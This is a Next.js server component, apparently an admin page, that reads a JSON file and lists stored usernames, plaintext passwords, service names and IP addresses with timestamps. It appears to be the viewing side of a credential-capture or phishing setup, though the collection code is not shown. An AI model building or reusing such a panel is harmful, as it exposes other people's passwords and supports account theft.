'use server';

import fs from "fs";
import path from "path";
import adminStyles from "@/components/userDataDisplay/userDataDisplay.module.css";
import { revalidatePath } from "next/cache";
import { redirect } from "next/navigation";
import { auth } from "@/actions/actions";

const userDataDisplay = async () => {

  async function getUserData() {
    if (! await auth()) redirect("/");

    let data = [];
    try {
      const filePath = path.join(process.cwd(), "data", "userData.json");

      if (fs.existsSync(filePath)) {
        const fileContent = fs.readFileSync(filePath, "utf8").trim();
        if (fileContent) {
          data = JSON.parse(fileContent);
        }
      }
    } catch (error) {
      console.error("Error reading  error: ", error);
      return { message: "Error reading file" };
    }
    return { message: "success", data };
  }

  const { data: dataSet, message: message } = await getUserData();
  revalidatePath('@/app/admin/userData/page.jsx')

  return (
    <div>
      {dataSet.length > 0 ? (
        <div className={adminStyles.dataColumn}>
          {dataSet.map((data, index) => (
            <div key={index} className={adminStyles.data}>
              <p className={adminStyles.par}>User Name: {data.username}</p>
              <p className={adminStyles.par}>Password: {data.password}</p>
              <p className={adminStyles.par}>Service: {data.service}</p>
              <p className={adminStyles.par}>IP Address: {data.ipv4}</p>
              <p className={adminStyles.par}>Date: {data.date.split("T")[0]}</p>
              <p className={adminStyles.par}>Time: {data.date.split("T")[1].split(".")[0]}</p>
            </div>
          ))}
        </div>

      ) : (
        <p>No data</p>
      )}
    </div>
  );
}

export default userDataDisplay;